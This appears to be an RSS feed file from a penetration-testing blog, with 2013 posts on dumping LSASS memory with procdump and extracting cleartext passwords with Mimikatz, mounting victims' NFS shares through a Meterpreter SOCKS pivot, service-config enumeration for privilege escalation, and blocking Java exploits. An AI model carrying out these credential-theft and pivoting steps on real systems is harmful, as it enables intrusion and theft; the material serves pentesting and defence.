@@ -1,0 +1,729 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Uncategorized on Room362</title>
+    <link>http://localhost:1313/tags/uncategorized/</link>
+    <description>Recent content in Uncategorized on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Fri, 07 Jun 2013 15:00:08 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/uncategorized/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</title>
+      <link>http://localhost:1313/post/2013/201367using-mimikatz-alpha-or-getting-clear-text-passwords-with-a-html/</link>
+      <pubDate>Fri, 07 Jun 2013 15:00:08 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/201367using-mimikatz-alpha-or-getting-clear-text-passwords-with-a-html/</guid>
+      <description>&lt;p&gt;Mimikatz is now&lt;a href=&#34;https://github.com/rapid7/meterpreter/pull/9&#34;&gt; built into Metasploit&amp;rsquo;s meterpreter&lt;/a&gt;, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.&lt;/p&gt;
+
+&lt;p&gt;Mimikatz Minidump: &lt;a href=&#34;http://blog.gentilkiwi.com/securite/mimikatz/minidump&#34;&gt;http://blog.gentilkiwi.com/securite/mimikatz/minidump&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Procdump: &lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&#34;&gt;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;net use \TARGETBOXC$ /user:DOMAINserviceaccount serviceaccount123
+dir \TARGETBOXC$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If that works then we want to check that we can all the &amp;ldquo;AT&amp;rdquo; command on the remote host:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;at \TARGETBOX
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All set. Next lets prep our workspace on the remote host. We are using the C:Temp directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mkdir \TARGETBOXC$Temp
+dir \TARGETBOXC$Temp
+copy c:tempprocdump.exe \TARGETBOXC$
+copy c:tempprocdump.bat \TARGETBOXC$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The contents of procdump.bat are:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;@echo off
+C:tempprocdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I&amp;rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&amp;rsquo;ve dumped more than one IP that is actually the same host.&lt;/p&gt;
+
+&lt;p&gt;Next we schedule the task. Use net time to determine the local time for the remote machine.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;net time \TARGETBOX
+at \TARGETBOX 13:52 C:Tempprocdump.bat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Pull down the file and clean up:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;dir \TARGETBOXC$Temp
+copy \TARGETBOXC$Temp*lsass.dmp C:tempoutput
+rmdir /s \TARGETBOXC$Temp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:&lt;a href=&#34;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&#34;&gt;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Load up the Alpha version of Mimikatz, switch it to minidump mode and you&amp;rsquo;re dumping creds:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
+Switch to MINIDUMP
+
+mimikatz # sekurlsa::logonPasswords full
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thats it. Password dumping without ever using a &amp;ldquo;Hacker&amp;rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Query all windows services config from the command line</title>
+      <link>http://localhost:1313/post/2013/2013/5/29/query-all-windows-services-config-from-the-command-line/</link>
+      <pubDate>Thu, 30 May 2013 02:56:57 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013/5/29/query-all-windows-services-config-from-the-command-line/</guid>
+      <description>&lt;p&gt;This is how I did it:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;for /f &amp;quot;tokens=5 delims=&amp;quot; %A in (&#39;reg query HKLMSYSTEMCurrentControlSetServices&#39;) do sc qc %A&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Let me know if you know of a better way.&lt;/p&gt;
+
+&lt;p&gt;If you don&amp;rsquo;t know why this could be important read here:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.ihtb.org/security/program.exe-privilege_escalation.txt&#34;&gt;http://www.ihtb.org/security/program.exe-privilege_escalation.txt&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;If you are on a Win7 box or otherwise have the option to use WMI you can use the following command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;wmic service get pathname&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Metasploit Mastery @BlackHatEvents USA 2013</title>
+      <link>http://localhost:1313/post/2013/2013319metasploit-mastery-blackhatevents-usa-2013-html/</link>
+      <pubDate>Tue, 19 Mar 2013 14:38:36 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013319metasploit-mastery-blackhatevents-usa-2013-html/</guid>
+      <description>&lt;p&gt;Just a quick post to say that &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egypt&lt;/a&gt; and I will be giving Metasploit Mastery twice (2 x 2 day sessions) at BlackHat USA 2013. Come out and get your Metasploit on in Vegas w/ us&lt;/p&gt;
+
+&lt;p&gt;Linky: &lt;a href=&#34;http://www.blackhat.com/us-13/training/metasploit-mastery.html&#34;&gt;http://www.blackhat.com/us-13/training/metasploit-mastery.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Current fill rate of July 27-28 session:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://www.blackhat.com/images/us-13/trainbars/July2728MetasploitMastery.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Current fill rate of July 29-30 session:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://www.blackhat.com/images/us-13/trainbars/July2930MetasploitMastery.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;EOM&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Length Sorting Wordlists</title>
+      <link>http://localhost:1313/post/2013/2013318length-sorting-wordlists-html/</link>
+      <pubDate>Mon, 18 Mar 2013 20:01:44 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013318length-sorting-wordlists-html/</guid>
+      <description>&lt;p&gt;This is one of those stupid simple things that are easy to forget so I&amp;rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&amp;rsquo;t have to, but there is times where it&amp;rsquo;s important.&lt;/p&gt;
+
+&lt;p&gt;Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&amp;rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits. However, if you start throwing rules into the mix that equation changes. If you have &amp;ldquo;iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&amp;rdquo; on the 3rd line of your dictionary, testing every possible permutation where you replace an &amp;lsquo;i&amp;rsquo; with a 1 is going to take a very long time.&lt;/p&gt;
+
+&lt;p&gt;Both Hashcat and John deal with this by limiting the length where permutations occur. (HC/JTR peeps please correct me if I&amp;rsquo;m wrong). Cain on the other hand, will try every possibility and hang on the 3rd line for years (over exagerated). How do you solve that? Easy, remove any word over a certain length. While that does work, and very similar to what the HC/JTR do, I don&amp;rsquo;t like loosing words from my dictionary, so I tend to sort them by length. That way, all the nasty ones are near the end and I can scale back the rules on them.&lt;/p&gt;
+
+&lt;p&gt;To do that is very simple:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;awk &#39;{print length, $0}&#39; rockyou.txt | sort -n | cut -d &amp;quot; &amp;quot; -f2- &amp;gt; rockyou_ls.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thats it. Basic, simple and stored here for reference.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Mounting NFS shares through Meterpreter with NfSpy</title>
+      <link>http://localhost:1313/post/2013/201334mounting-nfs-shares-through-meterpreter-with-nfspy-html/</link>
+      <pubDate>Mon, 04 Mar 2013 21:20:19 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/201334mounting-nfs-shares-through-meterpreter-with-nfspy-html/</guid>
+      <description>&lt;p&gt;You&amp;rsquo;ve found an NFS share on a pentest, it&amp;rsquo;s sharing out your target&amp;rsquo;s home directories (/home) and some SAN with all of the Windows AD users &amp;ldquo;home&amp;rdquo; directories under /volumes/users/. You only have a meterpreter session though&amp;hellip; enough back story, problem is that Metasploit doesn&amp;rsquo;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&amp;rsquo;m wrong, but there also aren&amp;rsquo;t any tools for talking to NFS shares over TCP only proxies.&lt;/p&gt;
+
+&lt;p&gt;Enter NfSpy: &lt;a href=&#34;https://github.com/bonsaiviking/NfSpy&#34;&gt;https://github.com/bonsaiviking/NfSpy&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;While it&amp;rsquo;s original intent was aide in bypassing NFS security controls it has the right amount of options to make mounting NFS over Meterpreter possible.&lt;/p&gt;
+
+&lt;p&gt;First we setup up our route so that the aux module will go over the meterpreter session:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;route add 192.168.1.0 255.255.255.0 1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The 1 on the end being the meterpreter session number it&amp;rsquo;s going to be going through. Next up is to find out what exports are available:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/nfs/nfsmount
+msf auxiliary(nfsmount) &amp;gt; show options
+
+Module options (auxiliary/scanner/nfs/nfsmount):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    111              yes       The target port
+   THREADS  1                yes       The number of concurrent threads&amp;lt;
+
+msf auxiliary(nfsmount) &amp;gt; set RHOSTS 192.168.1.50
+RHOSTS =&amp;gt; 192.168.1.50
+msf auxiliary(nfsmount) &amp;gt; run
+[+] 192.168.1.50 NFS Export: /home [192.168.1.0/24]
+[+] 192.168.1.50 NFS Export: /volume/users [192.168.1.0/24]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looks like access is restricked by IP range, but luckily the victim is in said range. The final piece of information we need is the TCP port(s) that mountd is listening on. There is a metasploit module that can help use there too:&lt;/p&gt;
+
+&lt;p&gt;msf &amp;gt; use auxiliary/scanner/misc/sunrpc_portmapper
+msf auxiliary(sunrpc_portmapper) &amp;gt; show options&lt;/p&gt;
+
+&lt;p&gt;Module options (auxiliary/scanner/misc/sunrpc_portmapper):&lt;/p&gt;
+
+&lt;p&gt;Name     Current Setting  Required  Description&amp;lt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    111              yes       The target port
+   THREADS  1                yes       The number of concurrent threads&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(sunrpc_portmapper) &amp;gt; set RHOSTS 192.168.1.50
+RHOSTS =&amp;gt; 192.168.1.50
+msf auxiliary(sunrpc_portmapper) &amp;gt; run&lt;/p&gt;
+
+&lt;p&gt;[+] 192.168.1.50 - Programs available
+        rpcbind - 111/tcp
+        rpcbind - 111/udp&lt;br&gt;&lt;/br&gt;        status - 46797/udp&lt;br&gt;&lt;/br&gt;        status - 55731/tcp&lt;br&gt;&lt;/br&gt;        nfs - 2049/tcp&lt;br&gt;&lt;/br&gt;        nfs_acl - 2049/tcp&lt;br&gt;&lt;/br&gt;        nfs - 2049/udp&lt;br&gt;&lt;/br&gt;        nfs_acl - 2049/udp&lt;br&gt;&lt;/br&gt;        nlockmgr - 54167/udp&lt;br&gt;&lt;/br&gt;        nlockmgr - 38216/tcp&lt;br&gt;&lt;/br&gt;        mountd - 52569/udp&lt;br&gt;&lt;/br&gt;        mountd - 37719/tcp&lt;br&gt;&lt;/br&gt;        mountd - 39099/udp&lt;br&gt;&lt;/br&gt;        mountd - 55763/tcp&lt;br&gt;&lt;/br&gt;        mountd - 37808/udp&lt;br&gt;&lt;/br&gt;        mountd - 54457/tcp&lt;br&gt;&lt;/br&gt;[&lt;em&gt;] Scanned 1 of 1 hosts (100% complete)&lt;br&gt;&lt;/br&gt;[&lt;/em&gt;] Auxiliary module execution completed&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool, so lets target /home first with the mountd tcp port of 37719. Keeping our route where it is we set up Metasploit&amp;rsquo;s socks proxy:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/server/socks4a&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;msf auxiliary(socks4a) &amp;gt; show options&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Module options (auxiliary/server/socks4a):&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;   Name     Current Setting  Required  Description&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   ----     ---------------  --------  -----------&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   SRVHOST  0.0.0.0          yes       The address to listen on&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   SRVPORT  1080             yes       The port to listen on.&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;msf auxiliary(socks4a) &amp;gt; set SRVPORT 9050&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;SRVPORT =&amp;gt; 9050&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;msf auxiliary(socks4a) &amp;gt; set SRVHOST 127.0.0.1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;SRVHOST =&amp;gt; 127.0.0.1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;msf auxiliary(socks4a) &amp;gt; run&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] Auxiliary module execution completed&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] Starting the socks4a proxy server&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I chose 9050 as my SRVPORT since I have proxychains already set up for that port (ala tor) and I highly recommend setting the SRVHOST to 127.0.0.1, unless you either firewall that port off from the Internet or don&amp;rsquo;t mind having the Anons of the world surf through your meterpreter session into your clients.&lt;/p&gt;
+
+&lt;p&gt;Next up it actually using nfspy (create or prep a directory so you can mount it first):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;ProxyChains-3.1 (http://proxychains.sf.net)&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;FUSE library version: 2.8.6&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;nullpath_ok: 0&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 1, opcode: INIT (26), nodeid: 0, insize: 56&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;INIT: 7.16&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;flags=0x0000007b&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;max_readahead=0x00020000&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:9050-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-192.168.1.50:37719-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:9050-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-192.168.1.50:2049-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   INIT: 7.12&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   flags=0x00000011&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   max_readahead=0x00020000&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   max_write=0x00020000&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 1, success, outsize: 40&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets break that command down. Proxychains will wrap nfspy so that it goes through our Metasploit Socks4a proxy. The -d tells NfSpy to stay in the foreground, and -o for options. Server is our target IP, only use a hostname if your attacker box can resolve it to the right IP. The export we found with the Metasploit module is up next, and the default NFS port of 2049. The mountport option is from the port mapper Metasploit module. Both of these port options be sure you specify the /tcp or you&amp;rsquo;ll just be waiting as there isn&amp;rsquo;t really a time out and Proxychains doesn&amp;rsquo;t show UDP attempts. RW for read-write and finally the location to mount to.&lt;/p&gt;
+
+&lt;p&gt;If you see that second proxychains request for port 2049 it is usually a good indicator that it worked, if not you have probably run into anything from a permissions issue to a local mount problem. NfSpy uses fuse which can be really silent when problems arrise or give errors that tell you nothing meaningful. Thats why I&amp;rsquo;m using the -d option that keeps nfspy in the foreground, just so I can detect any issues. Lets see if that worked:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ls /root/nfspy/mount&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;user1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;user2&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;user3&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;user4&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Remember, big directories might take a while to navigate being tunneled like this. Here is the output from the ls on the nfspy side:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;unique: 166, opcode: OPENDIR (27), nodeid: 34, insize: 48&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 166, success, outsize: 32&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 167, opcode: READDIR (28), nodeid: 34, insize: 80&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;readdir[0] from 0&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 167, success, outsize: 208&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 168, opcode: LOOKUP (1), nodeid: 34, insize: 46&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;LOOKUP /home/user3&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;getattr /home/user3&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   NODEID: 40&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 168, success, outsize: 144&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 169, opcode: LOOKUP (1), nodeid: 34, insize: 46&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;LOOKUP /home/user1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;getattr /home/user1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   NODEID: 41&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 169, success, outsize: 144&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 170, opcode: LOOKUP (1), nodeid: 34, insize: 46&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;LOOKUP /home/user4&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;getattr /home/user4&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   NODEID: 42&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 170, success, outsize: 144&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 171, opcode: LOOKUP (1), nodeid: 34, insize: 46&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;LOOKUP /home/user2&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;getattr /home/user2&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   NODEID: 43&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 171, success, outsize: 144&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thats it. You can mount read-write (rw) or read-only (ro) depending on what you want to do and how quiet you want to be.&lt;/p&gt;
+
+&lt;p&gt;Last note, you can&amp;rsquo;t just CTRL-C an nfspy mount, you need to use &lt;code&gt;fusermount -u /root/nfspy/mount&lt;/code&gt; to kill it. It&amp;rsquo;s another fuse issue. If anyone has a better way to do this I&amp;rsquo;m all ears.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Suggestions on what to do when a service you use gets compromised</title>
+      <link>http://localhost:1313/post/2013/201332suggestions-on-what-to-do-when-a-service-you-use-gets-compro-html/</link>
+      <pubDate>Sat, 02 Mar 2013 21:02:22 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/201332suggestions-on-what-to-do-when-a-service-you-use-gets-compro-html/</guid>
+      <description>&lt;p&gt;It seems like every week there is a new compromise of some service or another. But as a user what are you supposed to do with this knowledge? Here are some suggestions on things to do or think about when reacting:&lt;/p&gt;
+
+&lt;p&gt;Do you use the password you use there anywhere else?&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Think about starting to use a password manager like LastPass, 1Password, KeePass, or a product like Yubico. This way you can very easily use different passwords for different sites.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Sit down and and start changing every where you use that password. Not just web sites, any machines (your work account) or applications are also possible targets. Start with the sites, machines, and applications that are most sensitive to you.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;It&amp;rsquo;s ok to have a hand written list of passwords for sites. One of my favorite suggestions is to take your drivers license or business card and generate passwords by using every X character on the license and base the X number on the how many letters are in the website. So you use every 6th character for Google.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;It is NOT ok to store your passwords for anything in a Excel, Word or Text document. These are easy pickings for hackers and almost always targeted.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Again, think about using a password manager&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Do NOT change your password on the affected site or service immediately. You may never know the extent of the compromise but if the company says anything to the effect of &amp;ldquo;still under investigation&amp;rdquo; or &amp;ldquo;preliminary results&amp;rdquo;, there is a chance that the attacker has also compromised the password reset mechanism so changing your password would just give the attacker the new one you have elected.&lt;/p&gt;
+
+&lt;p&gt;Do NOT stop using the service, if they have made it public that they were compromised, especially if they come out with the information first, the company is one of the few that take their dedication to their users seriously. If anything it&amp;rsquo;s a positive (that they came out and said something, not that they were compromised). Very few companies are open about such things as it happens much more often than people want to admit to.&lt;/p&gt;
+
+&lt;p&gt;Got other suggestions for people on how to handle such news? Leave a comment and I&amp;rsquo;ll include it in the main post with attribution.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Blocking Java Exploits, Malicious Signed Applets, and 0days</title>
+      <link>http://localhost:1313/post/2013/2013227blocking-java-exploits-malicious-signed-applets-and-0days-html/</link>
+      <pubDate>Wed, 27 Feb 2013 15:42:54 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013227blocking-java-exploits-malicious-signed-applets-and-0days-html/</guid>
+      <description>&lt;p&gt;The following has been a concept for me for a long time and recently I tweeted the idea which really put me under the fire to prove it. (re: justanidea hashtag)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_110240.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And a few people came up with some very valid points:&lt;/p&gt;
+
+&lt;p&gt;1) Doesn&amp;rsquo;t work so well with HTTPS sites&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103904.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;He&amp;rsquo;s right, but that forces the attack to use SSL, and doing so can yield the defender more information about the attacker, and offer other avenues of defense.&lt;/p&gt;
+
+&lt;p&gt;2) Cant an attack just spoof the user-agent?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103822.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and a response:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_105445.png&#34; alt=&#34;&#34; /&gt;But in actuality that setting is applied inside the Java code, which needs to be requested by Java first. Using it&amp;rsquo;s User-Agent string. There are probably ways to get this done with Java script or other methods of loading the Java classes/jars but I haven&amp;rsquo;t been able to find any.&lt;/p&gt;
+
+&lt;p&gt;and finally 3) Whitelisting is a myth!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103738.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Which goes along with phoobar&amp;rsquo;s responses as well:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_105906.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yes, there will definitely be challenge when implementing blocking java user agents, and one of the biggest pit falls is that there is no clear indicators to a user that that&amp;rsquo;s the reason for the block. There are ways to make it more evident with custom proxy error pages, but it is a thorn in this solution.&lt;/p&gt;
+
+&lt;p&gt;On to the walking of the walk. Oddly enough there is little to no documentation on blocking or even detecting outbound user-agent strings. But I did happen across an excellent post about how to use Squid to block IE (which I&amp;rsquo;m all for! ;-):&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://gaugusch.at/squid.shtml&#34;&gt;http://gaugusch.at/squid.shtml&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The following is just my testing of his walk-through converted to be used to block java:&lt;/p&gt;
+
+&lt;p&gt;I used pfSense for my testing since it&amp;rsquo;s very easy to set up and already has Squid as a package:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_094251.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You get the point.&lt;/p&gt;
+
+&lt;p&gt;We set up the latest Java 0day in Metasploit:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Get the user to go to our malicious web site:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103035.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And the user doesn&amp;rsquo;t see anything. This can be modified in the module. You also see that I was using &amp;ldquo;Intranet&amp;rdquo; IP space so some IE settings were lower, but nothing that would effect this exploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103042.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And shell! I want to pull your attention to that YWpdDan.jar request though. That request actually is done by Java with the following user-agent:&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;Mozilla/4.0 (Windows XP 5.1) Java/1.7.0_09&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;Alright, so the exploit works, but how about the solution? In pfSense you have the ability to slam &amp;ldquo;Custom Options&amp;rdquo; into the bottom of pfSense&amp;rsquo;s Squid config page. Like so:&lt;/p&gt;
+
